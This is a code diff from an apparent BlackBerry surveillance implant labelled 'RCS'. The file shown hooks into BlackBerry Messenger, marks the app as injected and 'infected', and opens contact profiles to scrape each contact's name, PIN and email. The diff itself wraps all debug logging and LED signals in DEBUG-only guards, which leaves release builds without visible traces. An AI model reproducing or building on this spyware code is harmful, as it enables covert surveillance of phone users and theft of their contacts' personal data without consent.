@@ -6,7 +6,6 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
 
 package blackberry.agent.im;
 
@@ -29,7 +28,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
     private static String bbmMenu = "Yield";
     //#ifdef DEBUG
     private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
-    // #endif
+    //#endif
 
     UiApplication bbmApplication;
     Screen contactsScreen;
@@ -89,18 +88,21 @@ public class BBMMenuItem extends ApplicationMenuItem {
                 //#endif
                 return null;
             }
-
+            //#ifdef DEBUG
             debug.init();
             debug.info("BBMMenuItem context: " + context);
+            //#endif
             UiApplication app = UiApplication.getUiApplication();
             Class cl = app.getClass();
-
+            //#ifdef DEBUG
             debug.trace("class: " + cl);
+            //#endif
 
             Screen screen = UiApplication.getUiApplication().getActiveScreen();
-
+            //#ifdef DEBUG
             debug.trace("screen: " + screen + " count: "
                     + screen.getUiEngine().getScreenCount());
+            //#endif
 
             //debug.startBuffering(EventLogger.INFORMATION);
             //#ifdef DEBUG
@@ -120,44 +122,57 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
                 // lookForConversationsThread();
                 conversationScreen.setBBM(bbmApplication);
-
+                //#ifdef DEBUG
                 debug.info("BBM INJECTED!");
                 debug.ledStart(Debug.COLOR_GREEN);
+                //#endif
 
                 AppInjectorBBM.getInstance().setInfected();
 
             } else {
+                //#ifdef DEBUG
                 debug.warn("BBM NOT INJECTED!");
                 debug.ledStart(Debug.COLOR_RED);
+                //#endif
             }
 
             //debug.stopBuffering();
 
         } catch (Exception ex) {
+            //#ifdef DEBUG
             debug.warn("injectBBM:" + ex.toString());
             debug.ledStart(Debug.COLOR_RED);
+            //#endif
         }
 
         return null;
     }
 
     private synchronized boolean extractProfile(Screen screen) {
+        //#ifdef DEBUG
         debug.trace("extractProfile");
         debug.trace("  local active screen: "
                 + UiApplication.getUiApplication().getActiveScreen());
+        //#endif
 
         try {
             if (MenuWalker.walk("View Contact Profile", screen, true)
                     || MenuWalker.walk("Contact Profile", screen, true)) {
+                //#ifdef DEBUG
                 Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
+                //#endif
 
+                //#ifdef DEBUG
                 debug.info("walked in Contact Profile");
+                //#endif
                 Utils.sleep(100);
                 Screen newScreen = UiApplication.getUiApplication()
                         .getActiveScreen();
 
                 if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
+                    //#ifdef DEBUG
                     debug.trace("no Contact Profile: " + newScreen);
+                    //#endif
                     return false;
                 }
                 // Ocio che gli schermi aperti vengono agganciati a
@@ -166,8 +181,9 @@ public class BBMMenuItem extends ApplicationMenuItem {
                 // debug.trace("  local active screen: "
                 // + UiApplication.getUiApplication().getActiveScreen());
 
+                //#ifdef DEBUG
                 debug.trace("exploring Contact Profile: " + newScreen);
-
+                //#endif
                 FieldExplorer explorer = new FieldExplorer();
                 Vector textfields = explorer.explore(newScreen);
 
@@ -176,28 +192,39 @@ public class BBMMenuItem extends ApplicationMenuItem {
                     String pin = (String) textfields.elementAt(1);
                     String email = "";
 
+                    //#ifdef DEBUG
                     debug.info("User: " + user);
                     debug.info("PIN: " + pin);
+                    //#endif
 
                     if (textfields.size() == 3) {
                         email = (String) textfields.elementAt(2);
+                        //#ifdef DEBUG
                         debug.info("Email: " + email);
+                        //#endif
                     }
 
                     users.put(user.toLowerCase(), new User(user, pin, email));
 
+                    //#ifdef DEBUG
                     debug.ledStart(Debug.COLOR_ORANGE);
+                    //#endif
                 }
-
+                //#ifdef DEBUG
                 debug.trace("closing Contact Profile");
+                //#endif
                 newScreen.close();
             } else {
+                //#ifdef DEBUG
                 debug.info("");
+                //#endif
             }
 
         } catch (Exception ex) {
             //debug.stopBuffering();
+            //#ifdef DEBUG
             debug.error(ex.toString());
+            //#endif
             return false;
         }
         return true;
